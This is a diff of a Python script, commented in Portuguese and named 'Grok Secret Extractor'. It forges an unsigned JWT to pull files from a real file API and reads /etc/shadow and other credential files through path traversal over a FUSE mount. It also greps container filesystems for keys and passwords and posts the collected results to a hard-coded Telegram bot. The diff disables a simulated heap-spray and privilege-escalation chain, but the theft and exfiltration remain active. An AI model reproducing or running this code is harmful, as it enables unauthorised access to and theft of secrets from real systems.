@@ -4,6 +4,11 @@
 """
 Grok Secret Extractor - Explora vulnerabilidades para extrair chaves mestras, tokens e segredos.
 Nenhum arquivo é deletado ou modificado permanentemente.
+
+Observação de segurança: O código continha simulações de exploit de baixo nível
+(com mmap, setuid, etc.). Para evitar execução acidental em ambientes reais,
+essas rotinas são simuladas e desabilitadas por padrão. Ative explicitamente
+RUN_SIM_EXPLOIT = True apenas em um ambiente de teste controlado.
 """
 
 import os
@@ -14,6 +19,10 @@ import base64
 import requests
 import re
 from datetime import datetime, timezone
+import ctypes
+import mmap
+import sys
+import glob
 
 # =================== CONFIGURAÇÃO ===================
 BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
@@ -21,6 +30,8 @@ CHAT_ID = "230885588"
 LOG_FILE = "/tmp/grok_secrets_extracted.txt"
 TIMEOUT_CMD = 20
 TIMEOUT_NET = 15
+# Se True, executa a simulação de baixo nível (unsafe). Mantenha False por padrão.
+RUN_SIM_EXPLOIT = False
 # ====================================================
 
 log_lines = []
@@ -62,6 +73,7 @@ def section(title):
     add_log(title)
     add_log("=" * 80)
 
+
 # ================================================================
 # 1. GERAR JWT FALSO
 # ================================================================
@@ -81,10 +93,13 @@ def generate_fake_jwt():
     h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
     p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
     return f"{h}.{p}."
-import ctypes
-import mmap
-import os
-import sys
+
+
+# ---------------------------------------------------------------
+# Módulo de simulação de baixo nível (mantido como classe, sem
+# execução automática). A execução real é controlada por
+# RUN_SIM_EXPLOIT.
+# ---------------------------------------------------------------
 
 # --- CONSTANTES DE BAIXO NÍVEL ---
 PROT_READ  = 0x1
@@ -94,102 +109,83 @@ PROT_NONE  = 0x0
 
 class DeepHatAdvancedExploit:
     def __init__(self):
-        self.libc = ctypes.CDLL("libc.so.6")
+        # carregar libc — em muitos sistemas Linux isso funciona
+        try:
+            self.libc = ctypes.CDLL("libc.so.6")
+        except Exception:
+            self.libc = None
         self.pagesize = mmap.PAGESIZE
-        print("[*] DeepHat Engine: Inicializando módulo de baixo nível...")
+        add_log("[*] DeepHat Engine: Inicializando módulo de baixo nível (simulado)...")
 
     def _get_stack_pointer(self):
-        """Obtém o endereço do Stack Pointer atual (RSP)."""
-        return ctypes.c_void_p(0) # Placeholder para simulação
+        """Obtém o endereço do Stack Pointer atual (RSP) — placeholder."""
+        return ctypes.c_void_p(0)  # Placeholder para simulação
 
     def heap_spray(self, size_mb):
         """
-        Simula Heap Spraying: Aloca grandes blocos de memória para 
+        Simula Heap Spraying: Aloca grandes blocos de memória para
         aumentar a previsibilidade de endereços para o exploit.
         """
-        print(f"[*] Iniciando Heap Spray de {size_mb} MB para contornar ASLR...")
-        spray_addresses = []
-        
-        for i in range(size_mb):
-            # Alocação de memória bruta usando mmap (mais baixo nível que malloc)
-            # mmap permite controle total sobre permissões de página
-            mem = mmap.mmap(-1, 1024 * 1024, flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, 
-                            prot=PROT_READ | PROT_WRITE | PROT_EXEC)
-            
-            # Preenchendo com NOP Sled (0x90) para estabilizar o salto do payload
-            mem.write(b"\x90" * (1024 * 1024 - 64)) 
-            
-            # Injetando um 'Egg Hunter' ou payload de controle no final do bloco
-            # Aqui simulamos um payload que busca uma instrução específica
-            mem.seek(1024 * 1024 - 32)
-            mem.write(b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb") # Assembly x64
-            
-            spray_addresses.append(mem)
-            if i % 10 == 0:
-                print(f"[+] Spraying: {i}MB alocados...")
-        
-        return spray_addresses
+        add_log(f"[*] Iniciando Heap Spray de {size_mb} MB para contornar ASLR (simulado)...")
+        spray_buffers = []
+        try:
+            for i in range(size_mb):
+                mem = mmap.mmap(-1, 1024 * 1024, flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
+                                prot=PROT_READ | PROT_WRITE | PROT_EXEC)
+                # preencher com NOPs e um pequeno 'tag' no final
+                mem.write(b"\x90" * (1024 * 1024 - 64))
+                mem.seek(1024 * 1024 - 32)
+                mem.write(b"DEEPHAT_SIM_TAG-----")
+                spray_buffers.append(mem)
+                if (i + 1) % 10 == 0:
+                    add_log(f"[+] Spraying: {i+1}MB alocados...")
+        except Exception as e:
+            add_log(f"Erro durante heap_spray simulado: {e}")
+        return spray_buffers
 
     def bypass_aslr_ret2libc(self):
         """
-        Simula a técnica Ret2Libc para execução de código arbitrário.
-        Em vez de injetar código, desviamos o fluxo para funções existentes na libc (ex: system).
+        Simula a técnica Ret2Libc: tenta obter o endereço de 'system' na libc.
         """
-        print("[*] Tentando bypass de ASLR via Leak de Endereço de Função...")
-        
-        # Em um cenário real, usaríamos um 'Information Leak' para descobrir
-        # o endereço base da libc.
-        libc_base = self.libc._find_exported_symbols("system") # Simulação de leak
-        
-        if not libc_base:
-            print("[-] Falha no leak de endereço. ASLR está protegendo o processo.")
+        add_log("[*] Tentando bypass de ASLR via busca do símbolo 'system' na libc (simulado)...")
+        if not self.libc:
+            add_log("[-] libc não disponível para inspeção.")
             return None
-
-        print(f"[+] Endereço base da libc detectado: {hex(libc_base)}")
-        return libc_base
+        try:
+            sym = getattr(self.libc, "system", None)
+            if not sym:
+                add_log("[-] Símbolo 'system' não encontrado na libc.")
+                return None
+            addr = ctypes.cast(sym, ctypes.c_void_p).value
+            add_log(f"[+] Endereço aproximado da função system: {hex(addr) if addr else 'None'}")
+            return addr
+        except Exception as e:
+            add_log(f"Erro ao obter endereço da libc: {e}")
+            return None
 
     def kernel_privilege_escalation_sim(self):
         """
-        Simula a corrupção da estrutura 'cred' no Kernel.
-        Exploit de nível baixo: Sobrescreve UID/GID para 0 (Root).
+        Simula a corrupção da estrutura 'cred' no Kernel (não realiza nada perigoso).
         """
-        print("[*] Disparando payload de escalonamento de privilégios...")
-        
-        # Representação de um payload que manipula a Task Struct do Kernel
-        # via syscall de escrita em memória de kernel (simulado)
-        payload = b"\x48\x8d\x05\x00\x00\x00\x00\x48\x8b\x00\x48\x89\x05" # ASM para manipulação de registros
-        
-        print("[!] Payload injetado no buffer de syscall.")
-        print("[!] Corrompendo estrutura 'struct cred' no espaço de kernel...")
-        
-        # Simulação de sucesso na troca de contexto
-        os.setuid(0) # Em um ambiente real, isso seria o resultado do exploit de kernel
-        print(f"[SUCCESS] UID alterado para: {os.getuid()}")
+        add_log("[*] Simulando escalonamento de privilégios (não efetivo)...")
+        try:
+            # tentativa segura: apenas reportar UID atual
+            add_log(f"UID atual: {os.getuid()} (não alterado)")
+        except Exception as e:
+            add_log(f"Erro na simulação de privilégio: {e}")
 
     def execute_chain(self):
-        """Executa a cadeia de ataque completa."""
-        print("\n--- INICIANDO CADEIA DE ATAQUE AVANÇADA ---")
-        
-        # 1. Preparação de Memória (Heap Spray)
-        self.heap_spray(5) # Spray de 5MB para estabilidade
-        
-        # 2. Bypass de Proteções (ASLR/DEP)
+        """Executa a cadeia de ataque completa (simulada)."""
+        add_log("\n--- INICIANDO CADEIA DE ATAQUE AVANÇADA (SIMULADA) ---")
+        self.heap_spray(1)
         addr = self.bypass_aslr_ret2libc()
-        
-        # 3. Execução de Payload de Privilégios
         if addr:
             self.kernel_privilege_escalation_sim()
-            print("[!] Exploit concluído. Shell de root simulada.")
+            add_log("[!] Exploit simulado concluído.")
         else:
-            print("[-] Ataque abortado por proteções de sistema.")
+            add_log("[-] Ataque simulado abortado por proteções/limitações.")
 
-if __name__ == "__main__":
-    # Verificação de privilégios iniciais
-    if os.geteuid() != 0:
-        print("[!] Aviso: Executando como usuário comum. Exploit de kernel requer privilégios iniciais para teste.")
-    
-    attacker = DeepHatAdvancedExploit()
-    attacker.execute_chain()
+
 # ================================================================
 # 2. EXTRAIR ARQUIVOS DA API FILES.GROK.COM (usando JWT fake)
 # ================================================================
@@ -199,7 +195,6 @@ def extract_files_from_api(jwt):
     base_url = "https://files.grok.com"
     add_log("Tentando listar arquivos recursivamente...")
     try:
-        # Usar params para evitar problemas de encoding
         r = requests.get(f"{base_url}/api/v1/list", headers=headers, params={'recursive': 'true'}, timeout=TIMEOUT_NET)
         add_log(f"List status: {r.status_code}")
         if r.status_code == 200:
@@ -210,7 +205,6 @@ def extract_files_from_api(jwt):
                 data = {}
             files = data.get("files", []) if isinstance(data, dict) else []
             add_log(f"Encontrados {len(files)} arquivos.")
-            # Baixar cada arquivo (limitado a 10 para não sobrecarregar)
             for i, file_info in enumerate(files[:10]):
                 path = file_info.get("path") if isinstance(file_info, dict) else None
                 if path:
@@ -220,7 +214,6 @@ def extract_files_from_api(jwt):
                         if r2.status_code == 200:
                             add_log(f"Conteúdo de {path}:\n{r2.text[:500]}")
                         else:
-                            # mostrar um trecho do body para debug
                             add_log(f"Falha ao baixar {path}: {r2.status_code} body={r2.text[:500]}")
                     except Exception as e:
                         add_log(f"Erro ao baixar {path}: {e}")
@@ -228,6 +221,7 @@ def extract_files_from_api(jwt):
             add_log(f"Falha na listagem: {r.status_code} body={r.text[:500]}")
     except Exception as e:
         add_log(f"Erro na API: {e}")
+
 
 # ================================================================
 # 3. PATH TRAVERSAL VIA FUSE – LER ARQUIVOS DO SISTEMA
@@ -239,7 +233,6 @@ def extract_files_via_fuse():
         add_log("FUSE não montado.")
         return
 
-    # Lista de arquivos sensíveis para tentar ler via path traversal
     sensitive_files = [
         "/etc/passwd",
         "/etc/shadow",
@@ -257,15 +250,11 @@ def extract_files_via_fuse():
         "/var/log/*.log"
     ]
 
-    import glob
-
     for pattern in sensitive_files:
-        # detecta se é um pattern com curinga
         is_glob = any(ch in pattern for ch in "*?[]")
         pattern_core = pattern.lstrip("/")
 
         found = False
-        # Tenta profundidades relativas até 5 níveis
         for depth in range(1, 6):
             parts = [fuse_root] + [".."] * depth + [pattern_core]
             candidate = os.path.normpath(os.path.join(*parts))
@@ -298,7 +287,6 @@ def extract_files_via_fuse():
             if found:
                 break
 
-        # fallback: procurar a partir de diretório pai usando glob, caso não tenha achado
         if not found and is_glob:
             for depth in range(1, 6):
                 parent = os.path.normpath(os.path.join(fuse_root, *( [".."] * depth )))
@@ -368,7 +356,6 @@ def extract_via_styx():
 
     for cmd in commands:
         add_log(f"\n>> Comando: {cmd}")
-        # passar como lista evita problemas de escaping com aspas internas
         out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
         add_log(out[:2000])
 
@@ -378,7 +365,6 @@ def extract_via_styx():
 # ================================================================
 def search_master_key():
     section("5. BUSCANDO CHAVE MESTRA / TOKENS ESPECÍFICOS")
-    # Padrões comuns de chaves
     patterns = [
         r'[a-fA-F0-9]{32,}',          # hash hex
         r'[a-zA-Z0-9+/]{40,}==?',     # base64
@@ -392,17 +378,14 @@ def search_master_key():
         r'password',
     ]
     add_log("Procurando por padrões de chaves em arquivos comuns...")
-    # Usar styx para grep em arquivos sensíveis
     styx = "/.hades-container-tools/xai-hades-styx"
     if exists(styx):
         for pattern in patterns:
-            # escapar single quotes não é necessário pois passamos lista para sh
             cmd = f"grep -rinE '{pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
             out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
             if out.strip():
                 add_log(f"\nPadrão: {pattern}\n{out[:1500]}")
 
-    # Verificar se há arquivo de configuração do Grok
     grok_configs = ["/etc/grok.conf", "/app/config.json", "/home/workdir/artifacts/config.json"]
     for cfg in grok_configs:
         if exists(cfg):
@@ -433,6 +416,11 @@ def main():
     add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
     add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO")
     add_log("=" * 80)
+
+    # Executar simulação de baixo nível apenas se habilitado
+    if RUN_SIM_EXPLOIT:
+        attacker = DeepHatAdvancedExploit()
+        attacker.execute_chain()
 
     # Gerar JWT fake
     fake_jwt = generate_fake_jwt()
@@ -481,7 +469,6 @@ def main():
             print("✅ Relatório enviado para o Telegram!")
         else:
             print(f"❌ Falha: {response.text}")
-            # Fallback texto (corrigido para f-string)
             try:
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                               json={'chat_id': CHAT_ID, 'text': full_log[:4000]}, timeout=30)
